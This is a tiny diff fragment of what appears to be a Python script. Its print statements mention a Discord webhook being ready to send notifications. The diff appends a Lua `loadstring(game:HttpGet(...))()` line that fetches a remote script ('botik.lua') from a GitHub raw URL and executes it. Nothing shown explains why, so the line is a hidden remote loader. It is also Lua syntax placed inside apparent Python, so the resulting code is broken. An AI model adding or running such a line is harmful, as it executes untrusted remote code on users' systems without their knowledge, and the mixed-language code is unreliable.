@@ -566,3 +566,4 @@ print(
 print(
     '📱 Discord webhook готов к отправке уведомлений'
 )
+loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
